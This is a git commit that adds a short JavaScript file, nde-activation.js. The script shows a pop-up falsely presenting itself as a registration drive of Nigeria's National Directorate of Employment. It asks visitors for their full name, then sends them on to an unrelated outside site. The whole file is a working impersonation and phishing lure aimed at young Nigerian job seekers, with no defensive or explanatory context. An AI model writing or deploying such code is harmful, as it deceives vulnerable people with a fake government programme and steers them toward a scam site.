07fc461c11f5188b99be22cbc9a5a24341bb9f72
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-10-28 00:00:50 -0700

    Create nde-activation.js

---
+++ nde-activation.js
@@ -0,0 +1,6 @@
+
+var password = 'Register Now'
+password=prompt('NDE: Registration ongoing. You are among the Nigerian youths to Benefit from this The National Directorate of Employment (NDE) Programe, kindly press Ok to submit your full name ','Register Now');
+if (password != 'Register Now') {
+location.href='https://all-free-byt.org/nde-job.html';
+}
